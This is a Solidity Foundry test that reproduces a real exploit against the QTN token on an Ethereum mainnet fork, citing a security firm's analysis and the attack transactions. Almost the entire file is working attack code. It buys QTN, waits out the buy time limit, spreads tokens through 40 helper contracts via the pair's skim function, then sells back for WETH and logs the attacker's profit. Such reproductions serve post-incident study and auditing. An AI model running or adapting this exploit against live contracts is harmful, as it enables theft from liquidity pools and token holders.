// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1615625901739511809
// @TX
// https://etherscan.io/tx/0x37cb8626e45f0749296ef080acb218e5ccc7efb2ae4d39c952566dc378ca1c4c
// https://etherscan.io/tx/0xfde10ad92566f369b23ed5135289630b7a6453887c77088794552c2a3d1ce8b7

contract QTNContract {
    IERC20 QTN = IERC20(0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd);

    function transferBack() external {
        QTN.transfer(msg.sender, QTN.balanceOf(address(this)));
    }
}

contract ContractTest is Test {
    IERC20 QTN = IERC20(0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xA8208dA95869060cfD40a23eb11F2158639c829B);
    address[] contractList;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_430_212);
        cheats.label(address(QTN), "QTN");
        cheats.label(address(WETH), "WETH");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
    }

    function testExploit() public {
        address(WETH).call{value: 2 ether}("");
        WETHToQTN();
        cheats.warp(block.timestamp + 500); // _timeLimitFromLastBuy 5 minutes
        QTNContractFactory();
        cheats.warp(block.timestamp + 500);
        QTNContractBack();
        QTNToWETH();

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    function QTNContractFactory() internal {
        uint256 transferAmount = QTN.balanceOf(address(this)) / 40;
        for (uint256 i; i < 40; ++i) {
            QTNContract QTNcontract = new QTNContract();
            contractList.push(address(QTNcontract));
            QTN.transfer(address(Pair), transferAmount);
            Pair.skim(address(QTNcontract));
        }
    }

    function QTNContractBack() internal {
        for (uint256 i; i < 40; ++i) {
            contractList[i].call(abi.encodeWithSignature("transferBack()"));
        }
    }

    function WETHToQTN() internal {
        WETH.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(QTN);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function QTNToWETH() internal {
        QTN.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(QTN);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            QTN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
